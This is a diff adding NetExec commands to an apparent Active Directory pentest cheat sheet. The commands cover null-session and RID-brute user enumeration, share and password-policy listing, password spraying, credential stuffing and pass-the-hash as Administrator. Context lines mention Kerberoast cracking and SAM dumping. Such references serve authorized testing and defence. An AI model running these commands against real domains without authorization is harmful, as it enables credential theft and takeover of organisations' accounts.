@@ -19,6 +19,21 @@ smbmap -H $DC -u "" -p ""
 ldapsearch -x -H ldap://$DC -s base
 ```
 
+**With Nxc**
+```bash
+# Check for Null Sessions / Basic Host Info
+nxc smb $IP -u '' -p ''
+nxc smb $IP -u 'Guest' -p ''
+
+# List SMB Shares (Checks Permissions)
+nxc smb $IP -u 'username' -p 'password' --shares
+
+# Enumerate Domain Users via RID Cycling (Great for Null Sessions)
+nxc smb $IP -u '' -p '' --rid-brute
+
+# List Active Domain Password Policy (Find lockout thresholds)
+nxc smb $IP -u 'username' -p 'password' --pass-pol
+```
 ## With creds — full enumeration
 
 ### BloodHound
@@ -66,6 +81,17 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 
 ## Credential dumping
 
+**Nxc**
+```bash
+# Password Spraying (Many users vs. One password)
+nxc smb $IP -u users.txt -p 'Winter2026!' --continue-on-success
+
+# Credential Stuffing (User list vs. Matching Password list)
+nxc smb $IP -u users.txt -p passwords.txt
+
+# Pass-the-Hash (Using NTLM hash instead of cleartext password)
+nxc smb $IP -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
+```
 ### From SAM (local admin)
 ```bash
 # remote (need local admin)
